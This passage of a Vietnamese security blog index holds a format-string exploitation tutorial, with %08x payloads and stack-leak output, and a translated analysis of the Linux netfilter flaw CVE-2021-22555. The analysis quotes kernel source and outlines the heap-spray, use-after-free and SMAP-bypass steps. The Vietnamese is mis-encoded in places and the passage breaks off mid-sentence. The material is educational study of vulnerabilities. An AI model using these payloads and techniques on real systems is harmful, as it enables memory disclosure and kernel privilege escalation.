input:\r%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\rThe wrong way to print user-controlled input:\r925a72a0.00000000.946a01e7.00000030.000000c8.c2052148.947819a8.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838.947a9700.c2051d60.945abab0.94781000.00000000.c2051de0.00000000.00000000.\r[*] test_val @ 0x92502010 = -72 0xffffffb8\r   Ta th·∫•y d·ªØ li·ªáu tr√™n stack ƒë√£ ƒë∆∞·ª£c in ra theo t·ª´ng nh√≥m 4 bytes, v√† 4 byte n√†y theo th·ª© t·ª± ng∆∞·ª£c do ki·∫øn tr√∫c little-endian. Nh·ªØng bytes 0x25, 0x30, 0x38, 0x78, 0x2e d∆∞·ªùng nh∆∞ l·∫∑p l·∫°i nhi·ªÅu l·∫ßn. C√πng xem th·ª≠ nh·ªØng byte n√†y c√≥ gi√° tr·ªã l√† g√¨?  1 2  ‚ûú fmt git:(main) ‚úó printf \u0026#34;\\x25\\x30\\x38\\x78\\x2e\\n\u0026#34;\r%08x.\r    Nh∆∞ ch√∫ng ta c√≥ th·ªÉ th·∫•y, v√πng nh·ªõ n√†y l√† gi√° tr·ªã c·ªßa format-string. V√¨ h√†m printf lu√¥n n·∫±m ·ªü v·ªã tr√≠ cao nh·∫•t tr√™n stack frame v√† format-string c√≥ th·ªÉ n·∫±m ·ªü b·∫•t k√¨ ƒë√¢u tr√™n stack. N√≥ s·∫Ω n·∫±m d∆∞·ªõi frame pointer hi·ªán t·∫°i.\nReading from Arbitrary Memory Addresses  ƒê·ªãnh d·∫°ng %s ƒë∆∞·ª£c d√πng ƒë·ªÉ ƒë·ªçc ƒë·ªãa ch·ªâ v√πng nh·ªõ b·∫•t k√¨. V√¨ n√≥ c√≥ th·ªÉ ƒë·ªçc d·ªØ li·ªáu c·ªßa chu·ªói ƒë·ªãnh d·∫°ng ban ƒë·∫ßu, m·ªôt ph·∫ßn c·ªßa chu·ªói ƒë·ªãnh d·∫°ng ban ƒë·∫ßu c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ cung c·∫•p ƒë·ªãa ch·ªâ cho tham s·ªë ƒë·ªãnh d·∫°ng %s, nh∆∞ ƒë∆∞·ª£c hi·ªÉn th·ªã ·ªü ƒë√¢y:    1 2 3 4 5 6  ‚ûú fmt git:(main) ‚úó ./fmt_vuln AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x\rThe right way to print user-controlled input:\rAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x\rThe wrong way to print user-controlled input:\rAAAAff9a1a6c.f7d7068c.08049234.f7d7976c.f7f6f110.ff9a1aac.ff9a1f24.00000003.00000000.f7fa3000.41414141\r[*] test_val @ 0x0804c02c = -72 0xffffffb8\r   4 bytes c·ªßa 0x41 cho th·∫•y tham s·ªë th·ª© 11 l√† d·ªØ li·ªáu b·∫Øt d·∫ßu c·ªßa chu·ªói ch√∫ng ta nh·∫≠p v√†o. N·∫øu ch√∫ng ta thay format-parameter th·ª© 4 th√†nh %s thay v√¨ %x, h√†m printf s·∫Ω in ra chu·ªói t·∫°i ƒë·ªãa ch·ªâ 0x41414141. Vi·ªác n√†y s·∫Ω l√†m crash ch∆∞∆°ng tr√¨nh v√¨ 0x41414141 l√† m·ªôt ƒë·ªãa ch·ªâ kh√¥ng h·ª£p l·ªá. Nh∆∞ng, n·∫øu ƒë·ªãa ch·ªâ n√†y h·ª£p l·ªá, th√¨ ta c√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c chu·ªói t·∫°i ƒë·ªãa ch·ªâ n√†y. Ta d√πng m·ªôt ch∆∞∆°ng tr√¨nh c√≥ t√™n l√† getenvaddr ƒë·ªÉ l·∫•y ƒë·ªãa ch·ªâ c·ªßa bi·∫øn m√¥i tr∆∞·ªùng PATH.  ","description":"Khai th√°c format string l√† m·ªôt kƒ© thu·∫≠t cho ph√©p b·∫°n chi·∫øm quy·ªÅn ki·ªÉm so√°t c·ªßa m·ªôt ch∆∞∆°ng tr√¨nh ƒë·∫∑c quy·ªÅn.... ","id":3,"section":"posts","tags":["exploitation"],"title":"Khai th√°c l·ªói Format Strings","uri":"https://minhlongmt183.github.io/posts/format-string/"},{"content":"B√†i vi·∫øt n√†y nh·∫±m m·ª•c ƒë√≠ch h·ªçc t·∫≠p c√° nh√¢n, ghi l·∫°i nh·ªØng ki·∫øn th·ª©c ƒë√£ h·ªçc ƒë·ªÉ nh·ªõ v√† hi·ªÉu r√µ h∆°n. B√†i vi·∫øt tham kh·∫£o ch·ªß y·∫øu t·ª´ CVE-2021-22555: Turning \\x00\\x00 into 10000$, ph·∫ßn l·ªõn l√† d·ªãch t·ª´ b√†i vi·∫øt g·ªëc c·ªông th√™m m·ªôt s·ªë l√≠ gi·∫£i c·ªßa t√¥i.\r T·ªïng quan v·ªÅ l·ªó h·ªïng  L·ªó h·ªóng cho ph√©p vi·∫øt d·ªØ li·ªáu b√™n ngo√†i v√πng cho ph√©p tr√™n heap (heap out-of-bound) Nh·ªØng phi√™n b·∫£n b·ªã ·∫£nh h∆∞·ªüng: Linux kernel *v2.6.19-rc1 - v5.12-rc8  M√¥i tr∆∞·ªùng th·ª±c thi, ki·ªÉm th·ª≠  Ubuntu 20.04 Linux kernel: 5.8.0-48-gen  Ph√¢n t√≠ch l·ªó h·ªïng  L·ªó h·ªïng ƒë∆∞·ª£c x√°c ƒë·ªãnh n·∫±m ·ªü trong h√†m xt_compat_target_from_user c·ªßa /net/netfilter/x_tables.c:  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,\runsigned int *size)\r{\rconst struct xt_target *target = t-\u0026gt;u.kernel.target;\rstruct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;\rint pad, off = xt_compat_target_offset(target);\ru_int16_t tsize = ct-\u0026gt;u.user.target_size;\rchar name[sizeof(t-\u0026gt;u.user.name)];\rt = *dstptr;\rmemcpy(t, ct, sizeof(*ct));\rif (target-\u0026gt;compat_from_user)\rtarget-\u0026gt;compat_from_user(t-\u0026gt;data, ct-\u0026gt;data);\relse\rmemcpy(t-\u0026gt;data, ct-\u0026gt;data, tsize - sizeof(*ct));\rpad = XT_ALIGN(target-\u0026gt;targetsize) - target-\u0026gt;targetsize;\rif (pad \u0026gt; 0)\rmemset(t-\u0026gt;data + target-\u0026gt;targetsize, 0, pad);\rtsize += off;\rt-\u0026gt;u.user.target_size = tsize;\rstrlcpy(name, target-\u0026gt;name, sizeof(name));\rmodule_put(target-\u0026gt;me);\rstrncpy(t-\u0026gt;u.user.name, name, sizeof(t-\u0026gt;u.user.name));\r*size += off;\r*dstptr += tsize;\r}\r   t·∫°i line 17-18 ch∆∞∆°ng tr√¨nh sao ch√©p pad k√≠ t·ª± 0 v√†o v√πng nh·ªõ b·∫Øt ƒë·∫ßu b·∫±ng t-\u0026gt;data + target-\u0026gt;targetsize. Trong tr∆∞·ªùng h·ª£p n√†y, target-\u0026gt;targetsize kh√¥ng b·ªã ki·ªÉm tra, do ƒë√≥ n√≥ c√≥ th·ªÉ ch·ª©a b·∫•t k√¨ gi√° tr·ªã n√†o, k·ªÉ c·∫£ gi√° tr·ªã √¢m. Ch√∫ng ta kh√¥ng th·ªÉ ki·ªÉm so√°t ƒë∆∞·ª£c gi√° tr·ªã c·ªßa target-\u0026gt;targetsize nh∆∞ng c√≥ th·ªÉ s·ª≠ d·ª•ng nhi·ªÅu target v·ªõi nhi·ªÅu k√≠ch th∆∞·ªõc kh√°c nhau b·ªüi t√™n c·ªßa ch√∫ng. V√≠ d·ª• nh∆∞ (TCPMSS, TTL, NFQUEUE)  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  // net/netfilter/x_NFLOG.c\rstatic struct xt_target nflog_tg_reg __read_mostly = {\r.name = \u0026#34;NFLOG\u0026#34;,\r.revision = 0,\r.family = NFPROTO_UNSPEC,\r.checkentry = nflog_tg_check,\r.destroy = nflog_tg_destroy,\r.target = nflog_tg,\r.targetsize = sizeof(struct xt_nflog_info),\r.me = THIS_MODULE,\r};\r// net/netfilter/x_NFQUEUE.c\rstatic struct xt_target nfqueue_tg_reg[] __read_mostly = {\r{\r.name = \u0026#34;NFQUEUE\u0026#34;,\r.family = NFPROTO_UNSPEC,\r.target = nfqueue_tg,\r.targetsize = sizeof(struct xt_NFQ_info),\r.me = THIS_MODULE,\r},\r{\r.name = \u0026#34;NFQUEUE\u0026#34;,\r.revision = 1,\r.family = NFPROTOR_UNSPEC,\r.checkentry = nfqueue_tg_check,\r.target = nfqueue_tg_v1,\r.targetsize = sizeof(struct xt_NFQ_info_v1),\r.me = THIS_MODULE,\r},\r{\r.name = \u0026#34;NFQUEUE\u0026#34;,\r.revision = 2,\r.family = NFPROTO_UNSPEC,\r.checkentry = nfqueue_tg_check,\r.target = nfqueue_tg_v2,\r.targetsize = sizeof(struct xt_NFQ_info_v2),\r.me = THIS_MODULE,\r},\r{\r.name = \u0026#34;NFQUEUE\u0026#34;,\r.revision = 2,\r.family = NFPROTO_UNSPEC,\r.checkentry = nfqueue_tg_check,\r.target = nfqueue_tg_v2,\r.targetsize = sizeof(struct xt_NFQ_info_v2),\r.me = THIS_MODULE,\r},\r{\r.name = \u0026#34;NFQUEUE\u0026#34;,\r.revision = 3,\r.family = NFPROTO_UNSPEC,\r.checkentry = nfqueue_tg_check,\r.targetsize = sizeof(struct xt_NFQ_info_v3),\r.me = THIS_MODULE,\r},\r};\r   target size kh√¥ng ƒë∆∞·ª£c cƒÉn ch·ªânh 8 bytes ƒë·ªÉ ƒëi·ªÅn khi pad \u0026gt; 0, do ƒë√≥, target size c√†ng l·ªõn th√¨ offset c√†ng l·ªõn. target size c√≥ k√≠ch th∆∞·ªõc l·ªõn nh·∫•t m√† t√°c gi·∫£ t√¨m ƒë∆∞·ª£c l√† NFLOG, v·ªõi n√≥, ch√∫ng ta c√≥ th·ªÉ ch·ªçn offset l√™n ƒë·∫øn 0x4c out-of-bounds (ch√∫ng ta c√≥ th·ªÉ thay ƒë·ªïi offset b·∫±ng c√°ch th√™m padding v√†o gi·ªØa 2 c·∫•u tr√∫c struct xt_entry_match v√† struct xt_entry_target):  1 2 3 4 5 6 7 8 9  struct xt_nflog_info{\r/* \u0026#39;len\u0026#39; will be used iff you set XT_NFLOG_F_COPY_LEN in flags */\r__u32 len;\r__u16 group;\r__u16 threshold;\r__u16 flags;\r__u16 pad;\rchar prefix[64];\r};\r   B√™n c·∫°nh ƒë√≥, t-\u0026gt;data ƒë∆∞·ª£c c·∫•p ph√°t b·ªüi h√†m xt_alloc_table_info trong /net/netfilter/x_tables.c  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  struct xt_table_info *xt_alloc_table_info(unsigned int size)\r{\rstruct xt_table_info *info = NULL;\rsize_t sz = sizeof(*info) + size;\rif (sz \u0026lt; sizeof(*info) || sz \u0026gt;= XT_MAX_TABLE_SIZE)\rreturn NULL;\rinfo = kvmalloc(sz, GFP_KERNEL_ACCOUNT);\rif (!info)\rreturn NULL;\rmemset(info, 0, sizeof(*info));\rinfo-\u0026gt;size = size;\rreturn info;\r}\r  V√πng nh·ªõ ƒë∆∞·ª£c ghi c·∫•p ph√°t ·ªü line 9 v·ªõi flag GFP_KERNEL_ACCOUNT v√† k√≠ch th∆∞·ªõc l√† sz\nM·∫∑c d√π v·∫≠y, k√≠ch th∆∞·ªõc t·ªëi thi·ªÉu \u0026gt; 0x100, c√≥ nghƒ©a k√≠ch th∆∞·ªõc nh·ªè nh·∫•t c·ªßa ƒë·ªëi t∆∞·ª£ng c√≥ th·ªÉ c·∫•p ph√°t l√† kmalloc-512. Ch√∫ng ta t√¨m ƒë·ªëi t∆∞·ª£ng ƒë∆∞·ª£c c·∫•p ph√°t gi·ªØa kmalloc-512 v√† kmalloc-8192 ƒë·ªÉ khai th√°c.\nT·∫°i sao bi·∫øt 0x100? size l√† ƒë·ªëi t∆∞·ª£ng ch√∫ng ta truy·ªÅn v√†o, do ƒë√≥, ƒë·ªÉ bi·∫øt c·∫ßn trace xem h√†m n√†y ƒë∆∞·ª£c g·ªçi ·ªü ƒë√¢u? V√¨ k√≠ch th∆∞·ªõc c·ªßa struct xt_table_info = 0x100\r\n K√≠ch th∆∞·ªõc SIZE n√†y ch√∫ng ta ki·ªÉm so√°t ƒë∆∞·ª£c b·∫±ng c√°ch t√¨m xem h√†m xt_alloc_table_info ƒë∆∞·ª£c g·ªçi, v√≠ d·ª• nh∆∞ h√†m static int compat_do_replace():  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  static int\rcompat_do_replace(struct net *net, void __user *user, unsigned int len)\r{\rint ret;\rstruct compat_ipt_replace tmp;\rstruct xt_table_info *newinfo;\rvoid *loc_cpu_entry;\rstruct ipt_entry *iter;\rif (copy_from_user(\u0026amp;tmp, user, sizeof(tmp)) != 0) // size c·ªßa tmp ƒë∆∞·ª£c x√°c ƒë·ªãn b·ªüi user\r return -EFAULT;\r/* overflow check */\rif (tmp.num_counters \u0026gt;= INT_MAX / sizeof(struct xt_counters))\rreturn -ENOMEM;\rif (tmp.num_counters == 0)\rreturn -EINVAL;\rtmp.name[sizeof(tmp.name)-1] = 0;\rnewinfo = xt_alloc_table_info(tmp.size); // size c·ªßa tmp ƒë∆∞·ª£c truy·ªÅn v√†o\r ......\r}\r   V√¨ t-\u0026gt;data ch√∫ng ta c√≥ th·ªÉ ki·ªÉm so√°t ƒë∆∞·ª£c th√¥ng qua size, n√™n b√¢y gi·ªù ta t√¨m c√°ch ƒë∆∞a n√≥ v·ªÅ cu·ªëi c√πng c·ªßa heap block. Ta xem x√©t h√†m compat_copy_entry_from_user  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  static void\rcompat_copy_entry_from_user(struct compat_ipt_entry *e, void **dstptr,\runsigned int *size,\rstruct xt_table_info *newinfo, unsigned char *base)\r{\rstruct xt_entry_target *t;\rstruct ipt_entry *de;\runsigned int origsize;\rint h;\rstruct xt_entry_match *ematch;\rorigsize = *size;\rde = *dstptr;\rmemcpy(de, e, sizeof(struct ipt_entry));\rmemcpy(\u0026amp;de-\u0026gt;counters, \u0026amp;e-\u0026gt;counters, sizeof(e-\u0026gt;counters));\r*dstptr += sizeof(struct ipt_entry);\r*size += sizeof(struct ipt_entry) - sizeof(struct compat_ipt_entry);\rxt_ematch_foreach(ematch, e)\rxt_compat_match_from_user(ematch, dstptr, size);\rde-\u0026gt;target_offset = e-\u0026gt;target_offset - (origsize - *size);\rt = compat_ipt_get_target(e);\rxt_compat_target_from_user(t, dstptr, size);\rde-\u0026gt;next_offset = e-\u0026gt;next_offset - (origsize - *size);\rfor (h = 0; h \u0026lt; NF_INET_NUMHOOKS; h++) {\rif ((unsigned char *)de - base \u0026lt; newinfo-\u0026gt;hook_entry[h])\rnewinfo-\u0026gt;hook_entry[h] -= origsize - *size;\rif ((unsigned char *)de - base \u0026lt; newinfo-\u0026gt;underflow[h])\rnewinfo-\u0026gt;underflow[h] -= origsize - *size;\r}\r}\r   Ch√∫ng ta th·∫•y t·∫°i line 15 d√≤ng l·ªánh *dstptr += sizeof(struct ipt_entry); s·∫Ω ƒë·∫©y con tr·ªè t-\u0026gt;data v·ªÅ ph√≠a cu·ªëi c·ªßa heap g·∫ßn h∆°n. Sau ƒë√≥, trong h√†m xt_compat_match_from_user t·∫°i line 25, con tr·ªè dstptr ti·∫øp t·ª•c ƒë∆∞·ª£c c·ªông *dstptr += msize l√†m cho t-\u0026gt;data th√™m m·ªôt l·∫ßn n·ªØa ch·∫°y g·∫ßn v·ªÅ ph√≠a cu·ªëi heap h∆°n.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  void xt_compat_match_from_user(struct xt_entry_match *m, void **dstptr, unsigned int *size)\r{\rconst struct xt_match *match = m-\u0026gt;u.kernel.match;\rstruct compat_xt_entry_match *cm = (struct compat_xt_entry_match *)m;\rint pad, off = xt_compat_match_offset(match);\ru_int16_t msize = cm-\u0026gt;u.user.match_size;\rchar name[sizeof(m-\u0026gt;u.user.name)];\rm = *dstptr;\rmemcpy(m, cm, sizeof(*cm));\rif (match-\u0026gt;compat_from_user)\rmatch-\u0026gt;compat_from_user(m-\u0026gt;data, cm-\u0026gt;data);\relse\rmemcpy(m-\u0026gt;data, cm-\u0026gt;data, msize - sizeof(*cm));\rpad = XT_ALIGN(match-\u0026gt;matchsize) - match-\u0026gt;matchsize\rif (pad \u0026gt; 0)\rmemset(m-\u0026gt;data + match-\u0026gt;matchsize, 0, pad);\rmsize += off;\rm-\u0026gt;u.user.match_size = msize;\rstrlcpy(name, match-\u0026gt;name, sizeof(name));\rmodule_put(match-\u0026gt;me);\rstrncpy(m-\u0026gt;u.user.name, name, sizeof(m-\u0026gt;u.user.name));\r*size += off;\r*dstptr += msize;\r}\r  v√† msize ƒë∆∞·ª£c ki·ªÉm so√°t b·∫±ng c√°ch x√¢y d·ª±ng c·∫•u tr√∫c d·ªØ li·ªáu ·ªü t·∫ßng user. Do ƒë√≥, ch√∫ng ta c√≥ m·ªôt chi·∫øn l∆∞·ª£c, l√† ki·ªÉm so√°t msize -\u0026gt; dstptr-\u0026gt;t-\u0026gt;data v·ªÅ cu·ªëi c√πng c·ªßa heap block, sau ƒë√≥ ki·ªÉm so√°t target-\u0026gt;targetsize ƒë·ªÉ ghi v√†o n·ªôi dung v√†o heap block ti·∫øp theo.\nKhai th√°c l·ªó h·ªïng struct msg_msg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  // include/linux/msg.h\r/* one msg_msg struct for each message */\rstruct msg_msg{\rstruct list_head m_list;\rlong m_type;\rsize_t m_ts; /* message text size */\rstruct *security;\r/* the actual message follows immediately */\r};\r// include/linux/types.h\rstruct list_head {\rstruct list_head *next, *prev;\r};\r// ipc/msgutils.c\rstruct msg_msgseg{\rstruct msg_msgseg *next;\r/* The next part of the message follow immediately*/\r};\r  struct msg_msg ƒë∆∞·ª£c c·∫•p ph√°t b·ªüi l·ªùi g·ªçi h·ªá th·ªëng msgsnd trong ipc/msgutil.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  static struct msg_msg *alloc_msg(size_t len)\r{\rstruct msg_msg *msg;\rstruct msg_msgseg **pseg;\rsize_t alen;\ralen = min(len, DATALEN_MSG);\rmsg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);\rif (msg == NULL)\rreturn NULL;\rmsg-\u0026gt;next = NULL;\rmsg-\u0026gt;security = NULL;\rlen -= alen;\rpseg = \u0026amp;msg-\u0026gt;next;\rwhile (len \u0026gt; 0){\rstruct msg_msgseg *seg;\rcond_resched();\ralen = min(len, DATALEN_SEG);\rseg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);\rif (seg == NULL)\rgoto out_err;\r*pseg = seg;\rpseg = \u0026amp;seg-\u0026gt;next;\rlen -= alen;\r}\rreturn msg;\rout_err:\rfree_msg(msg);\rreturn NULL;\r}\r  len l√† k√≠ch th∆∞·ªõc d·ªØ li·ªáu c·ªßa c·∫•u tr√∫c msg_msg.\nT·∫°o ra UAF  Nhi·ªÅu message queues ƒë∆∞·ª£c t·∫°o khi s·ª≠ d·ª•ng msgget(). Sau ƒë√≥, s·ª≠ d·ª•ng msgsnd() ƒë·ªÉ g·ª≠i message v·ªõi k√≠ch th∆∞·ªõc 4096 cho m·ªói message queue. Cu·ªëi c√πng, sau khi g·ª≠i m·ªôt s·ªë l∆∞·ª£ng l·ªõn c√°c messages, m·ªôt s·ªë c·∫•u tr√∫c struct msg_msg trong message queue ƒë∆∞·ª£c c·∫•p ph√°t li√™n t·ª•c tr√™n heap.\n. Sau ƒë√≥, msgsnd ƒë·ªÉ g·ª≠i m·ªôt message c√≥ k√≠ch th∆∞·ªõc 1024 t·ªõi m·ªói message queue. Message c√≥ k√≠ch th∆∞·ªõc 1024 s·∫Ω x√¢u chu·ªói v·ªõi message k√≠ch th∆∞·ªõc 4096 v√† l∆∞u trong th√†nh ph·∫ßn struct list_head c·ªßa struct msg_msg.\n. Khi g·ªçi msgrcv ƒë·ªÉ ƒë·ªçc c√°c ph·∫ßn c·ªßa 4096 message, n√≥ s·∫Ω gi·∫£i ph√≥ng v√πng nh·ªõ m√† c·∫•u tr√∫c msg_msg ƒë√£ gi·ªØ tr√™n heap.\n. Cu·ªëi c√πng, khi g·ªçi h√†m xt_alloc_table_info ƒë·ªÉ d√πng cho nh·ªØng block 4096 tr√™n heap th√¨ n√≥ ƒë√£ b·ªã gi·∫£i ph√≥ng ·ªü b∆∞·ªõc tr∆∞·ªõc ƒë√≥. L√≠ t∆∞·ªüng, ch√∫ng ta kh√¥ng n√™n gi·∫£i ph√≥ng c·∫•u tr√∫c A ng√†y sau 4096 heap block ƒë·ªÉ khi g·ªçi xt_alloc_table_info ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng out-of-bounds ƒë·ªÉ vi·∫øt m√£ tr·ªè t·ªõi nh·ªØng byte cu·ªëi c·ªßa c·∫•u tr√∫c struc msg_msg A m_list.next = 0.\n. C√≥ m·ªôt c∆° h·ªôi r·∫±ng 2 4096 struct msg_msg c√πng tr·ªè t·ªõi cung c·∫•u tr√∫c 1024 struct msg_msg B, n√≥ s·∫Ω tham kh·∫£o t·ªõi m·ªôt c·∫•u tr√∫c 4096 struct msg_msg kh√°c v√† UAF s·∫Ω xu·∫•t hi·ªán.\n. ƒê·ªÉ x√°c ƒë·ªãnh c·∫•u tr√∫c struct msg_msg B c√≥ ƒëang b·ªã tr·ªè t·ªõi 2 l·∫ßn hay kh√¥ng, ta g·ª≠i message c√≥ n·ªôi dung t∆∞∆°ng ·ª©ng v·ªõi s·ªë th·ª© t·ª± c·ªßa message: v√≠ d·ª• mesage 1 c√≥ n·ªôi dung l√† 1, message 2 c√≥ n·ªôi dung l√† 2, \u0026hellip;. message th·ª© 4096 c√≥ n·ªôi dung l√† 4096. Khi l·ªói x·∫£y ra, m·ªói message c·ªßa h√†ng ƒë·ª£i ƒë·ªÅu ƒë∆∞·ª£c ƒë·ªçc qua, n·∫øu t√≠nh nƒÉng n√†o c·ªßa c·∫•u tr√∫c B c√≥ n·ªôi dung kh√¥ng t∆∞∆°ng ·ª©ng v·ªõi ch·ªâ m·ª•c, c√≥ nghƒ©a n√≥ kh√¥ng n·∫±m trong h√†ng ƒë·ª£i, ƒëi·ªÅu n√†y c≈©ng c√≥ nghƒ©a c·∫•u tr√∫c B ƒëang t·ªìn t·∫°i 2 struct tr·ªè t·ªõi n√≥.  Bypass SMAP  ƒê·∫øn ƒë√¢y, struct msg_msg B ƒëang b·ªã double referemced, c√°i th·ª© nh·∫•t gi·∫£i ph√≥ng th·∫±ng B, v√† c√°i c√≤n l·∫°i tr√≤ t·ªõi B ch√∫ng ta c√≥ th·ªÉ ki·ªÉm so√°t ƒë∆∞·ª£c. B√¢y gi·ªù ch√∫ng ta d√πng h√†m socketpair() ƒë·ªÉ spray heap, spray l∆∞·ª£ng l·ªõn c√°c message v·ªõi k√≠ch th∆∞·ªõc 1024 v√† t·∫°o ra m·ªôt fake struct struct msg_msg structure. l√Ω t∆∞·ªüng ch√∫ng ta c√≥ th·ªÉ ph·ª•c h·ªìi c·∫•u tr√∫c msg_msg B ƒë√£ b·ªã gi·∫£i ph√≥ng. Ch√∫ √Ω r·∫±ng mlist.next l√† 41414141 v√¨ ch√∫ng ta kh√¥ng bi·∫øt ƒë·ªãa ch·ªâ c·ªßa kernel (khi SMAP ƒë∆∞·ª£c b·∫≠t, ch√∫ng ta kh√¥ng th·ªÉ t√≠nh ra ƒë·ªãa ch·ªâ c·ª• th·ªÉ c·ªßa user). Kh√¥ng c√≥ ƒë·ªãa ch·ªâ c·ªßa kernel th√¨ r·∫•t quan tr·ªçng v√¨ n√≥ l√†m ch√∫ng ta kh√¥ng th·ªÉ gi·∫£i ph√≥ng v√πng nh·ªõ 1 l·∫ßn n·ªØa. Nguy√™n nh√¢n l√† trong khi h√†m msgrcv(), message d∆∞·ª£c h·ªßy li√™n k·∫øt kh·ªèi h√†ng ƒë·ª£i l√† m·ªôt danh s√°ch v√≤ng tr√≤n. M·ªôt s·ªë tr∆∞·ªùng c·ªßa c·∫•u tr√∫c struct msg_msg cho ph√©p ch√∫ng ta leak ƒë∆∞·ª£c nh·ªØng th√¥ng tin n√†y. C·ª• th·ªÉ, tr∆∞·ªùng m_ts ƒë∆∞·ª£c d√πng ƒë·ªÉ x√°c ƒë·ªãnh l∆∞·ª£ng d·ªØ li·ªáu tr·∫£ v·ªÅ cho userland:  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/ipc/msgutil.c\rstruct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)\r{\rstruct msg_msgseg *dst_pseg, *src_pseg;\rsize_t len = src-\u0026gt;m_ts;\rsize_t alen;\rif (src-\u0026gt;m_ts \u0026gt; dst-\u0026gt;m_ts)\rreturn ERR_PTR(-EINVAL);\ralen = min(len, DATALEN_MSG);\rmemcpy(dst + 1, src + 1, alen);\r...\rreturn dst;\r}\r   K√≠ch th∆∞·ªõc ban ƒë·∫ßu c·ªßa message n√†y l√† 1024-sizeof(struct msg_msg) bytes, ch√∫ng ta c√≥ th·ªÉ t·∫°o DATALEN_MSG=4096-xizeof(struct msg_msg). Do ƒë√≥ ch√∫ng ta c√≥ th·ªÉ leak ƒë∆∞·ª£c th√¥ng tin t·ª´ header c·ªßa struct msg_msg trong message k·∫ø ti·∫øp. message queue ƒë∆∞·ª£c hi·ªán th·ª±c nh∆∞ng 1 danh s√°ch v√≤ng tr√≤n, do ƒë√≥, mlist.next s·∫Ω tr·ªè v·ªÅ message ch√≠nh.\nKhi bi·∫øt ƒë∆∞·ª£c ƒë·ªãa ch·ªâ c·ªßa message ch√≠nh, ch√∫ng ta c√≥ th·ªÉ t·∫°o l·∫°i fake strct msg_msg v·ªõi ƒë·∫°i ch·ªâ l√† next (segment ti·∫øp theo). N·ªôi dung c·ªßa message ch√≠nh c√≥ th·ªÉ ƒë∆∞·ª£c leak b·∫±ng c√°ch ƒë·ªçc nhi·ªÅu h∆°n DATALEN_MSG bytes. ƒê·ªãa ch·ªâ c·ªßa con tr·ªè mlist.next ƒë∆∞·ª£c leak t·ª´ message ch√≠nh s·∫Ω ti·∫øt l·ªô ƒë·∫°i ch·ªâ c·∫£u message th·ª© 2, n√≥ n·∫±m k·ªÅ c·∫•u tr√∫c struct msg_msg m√† chung ta mu·ªën l√†m gi·∫£. L·∫•y ƒë·ªãa ch·ªâ n√†y t·ª´ ƒëi 1024 ch√∫ng ta s·∫Ω c√≥ ƒë∆∞·ª£c ƒë·ªãa ch·ªâ c·ªßa message m√† ch√∫ng ta mu·ªën ki·ªÉm so√°t.\nv·∫´n ch∆∞a hi·ªÉu primary message l√† g√¨? tr·ªè nh∆∞ th·∫ø n√†o? ƒê·ªçc kƒ© h∆°n ph·∫ßn ph√¢n t√≠ch POC, flow th√¨ s·∫Ω hi·ªÉu r√µ\r  M·ªôt user-after-free t·ªët h∆°n.  T·ªõi ƒë√¢y ch√∫ng ta ph·∫£i x√¢y d·ª±ng ƒë∆∞·ª£c m·ªôt c·∫•u tr√∫c gi·∫£ struct msg_msg v·ªõi ƒë·ªãa ch·ªâ leak ƒë∆∞·ª£c l√† mlist.next v√† mlist.prev (nghƒ©a l√† n√≥ t·ª± tr·ªè t·ªõi ch√≠nh n√≥), b√¢y gi·ªù l√†m sao ƒë·ªÉ fake message b·ªã free trong h√†ng ƒë·ª£i fake message -queue.   Khi s·ª≠ d·ª•ng unix sockets, ch√∫ng ta c√≥ m·ªôt ƒë·ªëi t∆∞·ª£ng struct sk_buff tr·ªè t·ªõi fake message. ƒêi·ªÅu n√†y c√≥ nghƒ©a khi ch√∫ng ta gi·∫£i ph√≥ng tin nh·∫Øn gi·∫£ c·ªßa m√¨nh, tham th·∫£o t·ªõi n√≥ v·∫´n c√≤n t·ªìn ·ªü ƒë√≥.\nd·ªØ li·ªáu c·ªßa v√πng nh·ªõ tr√™n struct sk_buff l√† m·ªôt ch·∫•t li·ªáu tuy·ªát v·ªùi ƒë·ªÉ khai th√°c, v√¨ n√≥ kh√¥ng ch∆∞a th√¥ng tin ti√™u ƒë·ªÅ n√†o, nghƒ©a l√† ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng n√≥ ƒë·ªÉ gi·∫£i ph√≥ng b·∫•t k√¨ ƒë·ªëi t∆∞·ª£ng n√†o tr√™n v√πng nh·ªõ n√†y. Trong khi ƒë√≥, n·∫øu so s√°nh v·ªõi k·ªãch 